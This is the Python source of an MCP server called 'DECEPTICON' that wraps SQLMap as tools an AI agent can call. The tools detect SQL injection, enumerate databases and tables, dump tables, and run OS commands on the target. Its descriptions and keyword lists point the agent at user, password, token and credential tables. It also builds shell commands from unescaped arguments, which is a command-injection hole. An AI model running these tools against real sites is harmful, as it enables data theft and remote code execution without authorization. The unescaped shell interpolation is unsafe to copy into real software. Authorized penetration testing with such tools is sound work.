"""
DECEPTICON — SQLMap MCP Server
Wraps SQLMap for automated SQL injection detection and exploitation.

Install: pip install mcp sqlmap
Run:     python mcp_servers/sqlmap_server.py
"""

import asyncio
import json
import os
import re
import sys

# FIX: datetime was used in all call_tool implementations but never imported
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp import types
from docker_utils import run_in_container

app = Server("decepticon-sqlmap")

OUTPUT_DIR = "./sqlmap_output"
os.makedirs(OUTPUT_DIR, exist_ok=True)


# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────


def run_command(cmd: str, timeout: int = 600) -> dict:
    """Run a shell command inside the attacker container."""
    return run_in_container(cmd, timeout)


def parse_sqlmap_output(output: str) -> dict:
    """Extract key findings from sqlmap stdout."""
    result = {
        "injectable": False,
        "dbms": None,
        "injection_types": [],
        "databases": [],
        "tables": [],
        "columns": [],
        "dumped_data": [],
        "payloads": [],
    }

    if "is vulnerable" in output.lower() or (
        "parameter" in output.lower() and "injectable" in output.lower()
    ):
        result["injectable"] = True

    dbms_match = re.search(r"back-end DBMS: (.+)", output)
    if dbms_match:
        result["dbms"] = dbms_match.group(1).strip()

    for inj_type in [
        "boolean-based blind",
        "time-based blind",
        "error-based",
        "UNION query",
        "stacked queries",
        "inline queries",
    ]:
        if inj_type.lower() in output.lower():
            result["injection_types"].append(inj_type)

    db_section = re.search(r"available databases.*?\[(.*?)\]", output, re.DOTALL)
    if db_section:
        dbs = re.findall(r"\[\*\] (.+)", db_section.group(0))
        result["databases"] = [d.strip() for d in dbs]

    table_matches = re.findall(r"\[\*\] (.+)", output)
    if table_matches and result["databases"]:
        result["tables"] = [t.strip() for t in table_matches]

    payload_matches = re.findall(r"Payload: (.+)", output)
    result["payloads"] = [p.strip() for p in payload_matches[:5]]

    return result


# ─────────────────────────────────────────────
# TOOL DEFINITIONS
# ─────────────────────────────────────────────


@app.list_tools()
async def list_tools() -> list[types.Tool]:
    return [
        types.Tool(
            name="sqlmap_detect",
            description=(
                "Test a URL parameter for SQL injection vulnerability. "
                "Does NOT dump data — only detects and confirms injection. "
                "Run this FIRST before any data extraction. "
                "Returns injection type, DBMS, and affected parameter."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target URL with parameter (e.g. http://target.com/page?id=1)",
                    },
                    "data": {
                        "type": "string",
                        "description": "POST body data for POST injection (e.g. 'username=admin&password=test')",
                        "default": "",
                    },
                    "level": {
                        "type": "integer",
                        "description": "Test level 1-5 (default: 3, higher = more thorough but slower)",
                        "default": 3,
                    },
                    "risk": {
                        "type": "integer",
                        "description": "Risk level 1-3 (default: 2, higher = more aggressive tests)",
                        "default": 2,
                    },
                    "timeout": {"type": "integer", "default": 300},
                },
                "required": ["url"],
            },
        ),
        types.Tool(
            name="sqlmap_list_databases",
            description=(
                "List all databases accessible via confirmed SQL injection. "
                "Run AFTER sqlmap_detect confirms injection. "
                "Returns list of database names for targeting."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "data": {"type": "string", "default": ""},
                    "dbms": {
                        "type": "string",
                        "description": "Database type hint if known (mysql/mssql/postgresql/oracle)",
                        "default": "",
                    },
                    "timeout": {"type": "integer", "default": 300},
                },
                "required": ["url"],
            },
        ),
        types.Tool(
            name="sqlmap_list_tables",
            description=(
                "List all tables in a specific database via SQL injection. "
                "Run AFTER listing databases to identify interesting tables "
                "(users, passwords, admin, credentials, tokens)."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "database": {
                        "type": "string",
                        "description": "Target database name to enumerate tables from",
                    },
                    "data": {"type": "string", "default": ""},
                    "timeout": {"type": "integer", "default": 300},
                },
                "required": ["url", "database"],
            },
        ),
        types.Tool(
            name="sqlmap_dump_table",
            description=(
                "Dump contents of a specific table via SQL injection. "
                "Use on high-value tables like users, admin_users, credentials. "
                "Returns actual data rows — this is the proof-of-exploitation step."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "database": {"type": "string", "description": "Database name"},
                    "table": {"type": "string", "description": "Table name to dump"},
                    "data": {"type": "string", "default": ""},
                    "columns": {
                        "type": "string",
                        "description": "Specific columns to dump (e.g. 'username,password'). Leave empty for all.",
                        "default": "",
                    },
                    "timeout": {"type": "integer", "default": 300},
                },
                "required": ["url", "database", "table"],
            },
        ),
        types.Tool(
            name="sqlmap_os_shell",
            description=(
                "Attempt to obtain an OS command shell via SQL injection. "
                "Only available on MySQL with FILE privilege or MSSQL xp_cmdshell. "
                "Runs a single test command to verify code execution. "
                "WARNING: High noise, only use with explicit authorization."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "data": {"type": "string", "default": ""},
                    "command": {
                        "type": "string",
                        "description": "OS command to test (default: 'id')",
                        "default": "id",
                    },
                    "timeout": {"type": "integer", "default": 300},
                },
                "required": ["url"],
            },
        ),
    ]


# ─────────────────────────────────────────────
# TOOL IMPLEMENTATIONS
# ─────────────────────────────────────────────


@app.call_tool()
async def call_tool(name: str, arguments: dict) -> list[types.TextContent]:

    url = arguments.get("url", "")
    data = arguments.get("data", "")
    timeout = arguments.get("timeout", 300)

    base_flags = f"--batch --random-agent --output-dir={OUTPUT_DIR} --flush-session"
    data_flag = f'--data="{data}"' if data else ""

    # ── DETECT ────────────────────────────────────────────────────────
    if name == "sqlmap_detect":
        level = arguments.get("level", 3)
        risk = arguments.get("risk", 2)
        cmd = f'sqlmap -u "{url}" {data_flag} --level={level} --risk={risk} {base_flags} --forms'
        raw = run_command(cmd, timeout)
        parsed = parse_sqlmap_output(raw["stdout"])

        result = {
            "tool": "sqlmap_detect",
            "url": url,
            "command": cmd,
            "success": raw["success"],
            "timestamp": datetime.now().isoformat(),
            "injectable": parsed["injectable"],
            "dbms": parsed["dbms"],
            "injection_types": parsed["injection_types"],
            "payloads": parsed["payloads"],
            "raw_output_tail": raw["stdout"][-3000:],
            "next_step": (
                "sqlmap_list_databases"
                if parsed["injectable"]
                else "No injection found. Try different parameters."
            ),
        }

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    # ── LIST DATABASES ────────────────────────────────────────────────
    elif name == "sqlmap_list_databases":
        dbms = arguments.get("dbms", "")
        dbms_flag = f"--dbms={dbms}" if dbms else ""
        cmd = f'sqlmap -u "{url}" {data_flag} --dbs {dbms_flag} {base_flags}'
        raw = run_command(cmd, timeout)
        parsed = parse_sqlmap_output(raw["stdout"])

        result = {
            "tool": "sqlmap_list_databases",
            "url": url,
            "command": cmd,
            "success": raw["success"],
            "timestamp": datetime.now().isoformat(),
            "dbms": parsed["dbms"],
            "databases": parsed["databases"],
            "database_count": len(parsed["databases"]),
            "high_value_targets": [
                db
                for db in parsed["databases"]
                if any(
                    kw in db.lower()
                    for kw in [
                        "user",
                        "admin",
                        "auth",
                        "account",
                        "member",
                        "customer",
                        "pass",
                    ]
                )
            ],
            "raw_output_tail": raw["stdout"][-2000:],
        }

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    # ── LIST TABLES ───────────────────────────────────────────────────
    elif name == "sqlmap_list_tables":
        database = arguments["database"]
        cmd = f'sqlmap -u "{url}" {data_flag} -D {database} --tables {base_flags}'
        raw = run_command(cmd, timeout)

        tables = []
        in_table_section = False
        for line in raw["stdout"].split("\n"):
            if "Database:" in line and database.lower() in line.lower():
                in_table_section = True
            if in_table_section and re.match(r"\|\s+\w", line):
                table_name = re.sub(r"[\|\s]", "", line).strip()
                if table_name:
                    tables.append(table_name)

        result = {
            "tool": "sqlmap_list_tables",
            "url": url,
            "database": database,
            "command": cmd,
            "success": raw["success"],
            "timestamp": datetime.now().isoformat(),
            "tables": tables,
            "table_count": len(tables),
            "high_value_tables": [
                t
                for t in tables
                if any(
                    kw in t.lower()
                    for kw in [
                        "user",
                        "admin",
                        "pass",
                        "login",
                        "auth",
                        "account",
                        "token",
                        "secret",
                        "cred",
                        "member",
                    ]
                )
            ],
            "raw_output_tail": raw["stdout"][-2000:],
        }

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    # ── DUMP TABLE ────────────────────────────────────────────────────
    elif name == "sqlmap_dump_table":
        database = arguments["database"]
        table = arguments["table"]
        columns = arguments.get("columns", "")
        col_flag = f"-C {columns}" if columns else ""

        cmd = f'sqlmap -u "{url}" {data_flag} -D {database} -T {table} {col_flag} --dump {base_flags}'
        raw = run_command(cmd, timeout)

        dumped_data = []
        csv_path = os.path.join(OUTPUT_DIR, "dump", database, f"{table}.csv")
        if os.path.exists(csv_path):
            with open(csv_path, "r", errors="ignore") as f:
                dumped_data = f.read().split("\n")[:50]

        result = {
            "tool": "sqlmap_dump_table",
            "url": url,
            "database": database,
            "table": table,
            "command": cmd,
            "success": raw["success"],
            "timestamp": datetime.now().isoformat(),
            "dumped_rows": len(dumped_data) - 1 if dumped_data else 0,
            "dumped_data_preview": dumped_data[:20],
            "csv_saved_at": csv_path if os.path.exists(csv_path) else "Not found",
            "raw_output_tail": raw["stdout"][-3000:],
        }

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    # ── OS SHELL ──────────────────────────────────────────────────────
    elif name == "sqlmap_os_shell":
        command = arguments.get("command", "id")
        cmd = f'sqlmap -u "{url}" {data_flag} --os-cmd="{command}" {base_flags}'
        raw = run_command(cmd, timeout)

        cmd_output = ""
        match = re.search(r"command standard output: '(.+?)'", raw["stdout"], re.DOTALL)
        if match:
            cmd_output = match.group(1).strip()

        result = {
            "tool": "sqlmap_os_shell",
            "url": url,
            "os_command": command,
            "sqlmap_command": cmd,
            "success": raw["success"],
            "timestamp": datetime.now().isoformat(),
            "command_output": cmd_output,
            "rce_achieved": bool(cmd_output),
            "raw_output_tail": raw["stdout"][-2000:],
        }

        return [types.TextContent(type="text", text=json.dumps(result, indent=2))]

    else:
        return [
            types.TextContent(
                type="text", text=json.dumps({"error": f"Unknown tool: {name}"})
            )
        ]


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────


async def main():
    async with stdio_server() as (read_stream, write_stream):
        await app.run(read_stream, write_stream, app.create_initialization_options())


if __name__ == "__main__":
    asyncio.run(main())
